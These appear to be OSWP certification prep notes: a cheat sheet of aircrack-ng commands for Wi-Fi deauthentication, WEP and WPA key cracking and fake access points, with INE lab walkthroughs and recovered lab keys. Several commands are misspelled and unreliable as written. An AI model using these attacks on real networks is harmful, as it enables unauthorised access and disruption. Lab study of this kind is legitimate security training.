# oswp
oswp-prep

airmon-ng check
airmon-ng check kill

airmon-ng start <interface>
airmon-ng stop <interface>

iw dev <interface> info
iwconfig <interface>


airodump-ng -c <cahnnel_number> <interface>

airodump-ng -c <cahnnel_number> --bssid <mac_address_ap> <interface>
airodump-ng -c <cahnnel_number> -w <saved_file_name> --output-format csv,pcap <interface>

aireplay-ng 
              --deauth       --> -0
              --fakeauth     --> -1
              --interactive  --> -2
              --arpplay      --> -3
              --chopchop     --> -4
              --fragment     --> -5
              --caffe-latte  --> -6
              --cfrag        --> -7
              --migmade      --> -8
              --test         --> -9

aireplay-ng -9 <interface>
aireplay-ng -9 -e <wifi_name> -a <mac_address_ap> <interface>
aireplay-ng -9 -e <wifi_name> -a <mac_address_ap> -D <interface>

aireplay-ng -9 -i <interface1> <interface2>


aircrack-ng -S

airdecap-ng
airdecap-ng -b <mac_address_ap> <cap_file_name.cap> ---> cap_file_name_dec.cap


airgraph-ng (CAPR)
airgraph-ng -i <file.csv> -o capr.png -g CAPR
ristretto capr.png


4 way handsake 

AUTH 
    -> PSK
    -> GMT

airodump-ng -c <cahnnel_number> -w <file_name> --essid <wifi_name> --bssid <mac_address_ap> <interface>
aireplay-ng -0 1 -a <mac_address_ap> -c <client_mac_address> <interface>
aircrack-ng -w <wordlist_file> -e <wifi_name> -b <mac_address_ap> <captured_handsake_file>

airdecap-ng -b <mac_address_ap> -e <wifi_name> -p <password> <captured_file>

/usr/share/wordlist
/usr/share


JtR
Crunch
RsMangler


john --wordlist=<file> --rules --stdout | aircrack-ng -e <wifi_name> -w - <captured_file>

hashcat -m 2500
cap2hccapx


WEP Example
-----------

airmon-ng start <interface>

airodump-ng -c <channel_number> --bssid <mac_address_ap> <interface> -w <file_name>

aireplay_ng -1 0 -e <wifi_name> -a <mac_address_ap> -h <fake_client_mac_or_station> <interface>

aireplay-ng -5 -b <mac_address_ap> -h <fake_client_mac_or_station> <interface>

packerforge-ng -0 -a <mac_address_ap> -h <fake_client_mac_or_station> -I <ip> -k <ip_broadcast> -y fragment.xor -w <captured_file_name>

airplay-ng -2 -r <captured_file_name> <interface>

WEP Example 2
-------------

airmon-ng start <interface>

airodump-ng -c <channel_number> --bssid <mac_address_ap> <interface> -w <file_name>

aireplay_ng -1 0 -e <wifi_name> -a <mac_address_ap> -h <fake_client_mac_or_station> <interface>

aireplay_ng -1 0 -e <wifi_name> -y <file_xor> -h <fake_client_mac_or_station> <interface>

aireplay-ng --arpplay -b <mac_address_ap> -h <fake_client_mac_or_station> <interface>

aircrack-ng -0 <captured_file>


WPA Example 1
-------------
airmon-ng start <interface>

airodump-ng -c <channel_number> --bssid <mac_address_ap> <interface> -w <file_name>

aireplay-ng -0 1 -a <mac_address_ap> -c <client_mac_address> <interface>

aircrack-ng -0 -w <wordlist> <captured_file_name>



INE_Attack_defense_Example_WEP_1
--------------------------------
iw dev

iw dev wlan0 setup monitor none

airodump-ng wlan0

airodump-ng wlan0 -c 6 -w capture

aireplay-ng -3 -b B8:0D:F7:D5:79:F9 -h 02:00:00:00:09:00 wlan0

aircrack-ng capture-01.cap

**WPA Supplicant Configuration**
network={
  ssid="EpicMediaCorp"
  key_mgmt=NONE
  wep_key0="14332"
  wep_tx_keyidx=0
}

**wpa_supplicant -B -Dnl80211 -iwlan1 -c supplicant.conf**

**dhclient -v wlan1**



INE_Attack_defense_Example_WPA-PSK_1
------------------------------------
iw dev

airodump-ng wlan0 -c 6 -w test

aireplay-ng -0 100 -a A2:E9:68:D3:03:10 wlan0

aircrack-ng -w 100-common-passwords.txt test-01.cap

**WPA Supplicant Configuration**
network={
  ssid="NewGenAirways"
  scan_ssid=1
  key_mgmt=WPA-PSK
  psk="jasmine1"
}
**wpa_supplicant -B -Dnl80211 -iwlan1 -c supplicant.conf**

**dhclient -v wlan1**


INE_Attack_defense_Example_AP-less_WPA2-PSK_1
----------------------------------------------
iw dev

airodump-ng wlan0 -c 6 -w capture

**Fake_ap.conf content:**
  interface=wlan1
  hw_mode=g
  channel=6
  driver=nl80211
  ssid=Woodwork_LLP
  auth_algs=1
  wpa=2
  wpa_key_mgmt=WPA-PSK
  rsn_pairwise=CCMP
  wpa_passphrase=123456789
  
**hostapd -d fake_ap.conf**

aircrack-ng -w 100-common-passwords.txt capture-01.cap
